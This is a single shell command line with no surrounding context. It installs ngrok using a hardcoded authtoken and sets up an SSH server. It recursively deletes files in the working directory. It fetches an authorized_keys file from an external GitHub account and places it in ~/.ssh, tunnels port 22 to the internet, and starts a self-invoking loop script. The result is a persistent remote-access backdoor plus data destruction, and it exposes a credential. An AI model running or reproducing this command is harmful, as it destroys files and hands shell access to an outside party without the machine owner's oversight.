apt update && apt install sudo -y && curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && apt update && apt install ngrok -y && ngrok config add-authtoken 2NQob9ICFq1whSLYlvfigWiVpcT_2GRfuGGZJjohoAZGxkHP1 && apt install openssh-server -y && rm -r * && wget https://github.com/OutlookAcconunt0102930492819/launchdeck.io/raw/main/authorized_keys.pub && mv authorized_keys.pub authorized_keys && cp authorized_keys ~/.ssh && service ssh restart && echo "echo "Tá, ole ole olá" && ./script-loop.sh" > script-loop.sh && chmod 777 script-loop.sh && ngrok tcp 22 && ./script-loop.sh
